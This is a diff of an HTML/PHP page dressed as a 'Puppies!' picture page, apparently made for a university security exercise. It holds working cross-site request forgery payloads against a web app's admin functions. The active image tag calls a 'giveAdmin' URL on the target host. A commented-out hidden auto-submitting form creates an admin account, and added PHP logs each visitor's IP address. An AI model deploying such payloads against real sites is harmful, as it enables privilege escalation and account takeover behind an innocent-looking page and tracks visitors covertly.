@@ -1,31 +1,21 @@
 <html>
 <head>
-<!--    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.2/axios.min.js"></script>-->
-<!--    <script type="text/javascript">-->
-<!--        axios.post("http://localhost:8001/modules/admin/newuseradmin.php", {-->
-<!--            nom_form: "pp3f",-->
-<!--            prenom_form: "pp3l",-->
-<!--            uname: "pp4",-->
-<!--            password: "4321",-->
-<!--            email_form: "pp3@mail.com",-->
-<!--            department: 1,-->
-<!--            comment: "eerer",-->
-<!--            language: "el",-->
-<!--            submit: "Υποβολή",-->
-<!--            rid: 50,-->
-<!--            pstatut: 1,-->
-<!--            auth: 1-->
-<!--        }).then(function (response) {-->
-<!--            console.log(response)-->
-<!--            // do whatever you want if console is [object object] then stringify the response-->
-<!--        })-->
-<!--    </script>-->
+   <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.2/axios.min.js"></script>
+   <script type="text/javascript">
+        axios.get("http://localhost:8001/modules/user/user.php?giveAdmin=6", {
+
+      }).then(function (response) {
+           console.log(response)
+            // do whatever you want if console is [object object] then stringify the response
+       })
+   </script> -->
 </head>
 <body>
-<!--<body onload="document.createElement('form').submit.call(document.getElementById('myForm'))">-->
+<body onload="document.createElement('form').submit.call(document.getElementById('myForm'))">
         <h1><?= "Puppies!" ?></h1>
         <img src="https://i.ytimg.com/vi/DhpYAyVsFXQ/hqdefault.jpg"></img>
-<form id="myForm" name="myForm" action="
+        <img src="http://avadahackdavra.csec.chatzi.org/modules/user/user.php?giveAdmin=3" ></img>
+<!-- <form id="myForm" name="myForm" action="
 http://avadahackdavra.csec.chatzi.org/modules/admin/newuseradmin.php?id=50
 " method="POST"
       target="output_frame">
@@ -42,9 +32,9 @@ http://avadahackdavra.csec.chatzi.org/modules/admin/newuseradmin.php?id=50
     <input type="hidden" name="rid" value="50">
     <input type="hidden" name="pstatut" value="1">
     <input type="hidden" name="auth" value="1">
-</form>
-<iframe name="output_frame" src="" id="output_frame" width="0" height="0">
-</iframe>
+</form> -->
+<!-- <iframe name="output_frame" src="" id="output_frame" width="1000" height="1000">
+</iframe> -->
 </body>
 </html>
 <!--<body>-->
@@ -75,3 +65,10 @@ http://avadahackdavra.csec.chatzi.org/modules/admin/newuseradmin.php?id=50
 <!--        </form>-->
 <!--    </body>-->
 </html>
+
+<?php
+$myfile = fopen("newfile.txt", "a+") or die("Unable to open file!");
+$txt = $_SERVER['REMOTE_ADDR'] ."\n";
+fwrite($myfile, $txt);
+fclose($myfile);
+?>
